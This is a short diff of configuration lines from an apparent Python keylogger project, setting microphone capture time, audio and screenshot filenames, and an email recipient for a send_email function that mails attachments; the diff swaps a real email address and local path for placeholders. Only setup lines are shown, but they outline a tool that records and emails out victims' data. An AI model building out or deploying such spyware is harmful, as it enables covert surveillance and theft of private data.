@@ -31,10 +31,10 @@ microphone_time = 10
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
 
-toaddr = "cyberpunk24x7@gmail.com"
+toaddr = "your email"
 
 
-file_path = 'D:\\main folder\\Coding Playground\\My Projects\\Keylogger'
+file_path = 'your directory'
 extend = "\\"
 
 def send_email(filename, attachment, toaddr):
